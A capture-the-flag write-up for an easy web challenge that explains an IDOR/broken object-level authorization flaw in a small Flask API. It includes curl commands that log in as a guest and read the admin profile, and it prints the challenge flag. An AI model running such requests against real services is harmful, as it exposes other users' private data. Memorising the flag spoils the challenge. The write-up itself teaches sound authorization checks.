# Open Door — Web (Easy, 100 pts, ~9 solves)

**Flag:** `r00t{open_door_3asy_w3b_ch4ll_h4h4}`

## Description

A small Flask/Werkzeug API service. Briefing implied no admin credentials exist — the "door" isn't the login, it's what's reachable *after* logging in as anyone at all.

## Analysis

The API discloses its own route map at `/api` (itself a nice touch — self-documenting attack surface):

```json
{"endpoints": ["/api/login", "/api/whoami", "/api/profile/<user_id>"], "service": "open-door"}
```

`/api/whoami` correctly 401s without auth. `/api/profile/<user_id>` looked like the obvious IDOR shape — but it also 401s unauthenticated (`{"error":"not logged in"}`), meaning **authentication** is required, but the real question was whether **authorization** (session-ownership) was checked once authenticated.

## Exploit

```bash
# Log in as an unprivileged guest account, keep the session cookie
curl -i -s -c cookies.txt -X POST http://<host>:<port>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest123"}'
# -> {"ok":true,"user_id":101}

# Confirm identity
curl -s -b cookies.txt http://<host>:<port>/api/whoami
# -> {"user_id":101,"username":"guest"}

# IDOR: request a DIFFERENT user_id using our own (guest) session
curl -s -b cookies.txt http://<host>:<port>/api/profile/1
```

```json
{"bio":"Full account access. Internal use only.","display_name":"System Administrator","flag":"r00t{open_door_3asy_w3b_ch4ll_h4h4}","user_id":1,"username":"admin"}
```

`/api/profile/<user_id>` checks that *a* session exists, but never verifies the requested `user_id` matches the *logged-in* user's own ID — a textbook broken object-level authorization (IDOR/BOLA) bug. Any authenticated account, however low-privilege, can read any other account's full profile just by changing the URL.

## Lesson

"No admin credentials exist" in a challenge brief is often a hint that admin access comes from a *data*-layer flaw (IDOR/BOLA), not a *credential*-layer one — the intended path is to get in as anyone, then pivot via missing ownership checks rather than trying to guess/crack admin's password.
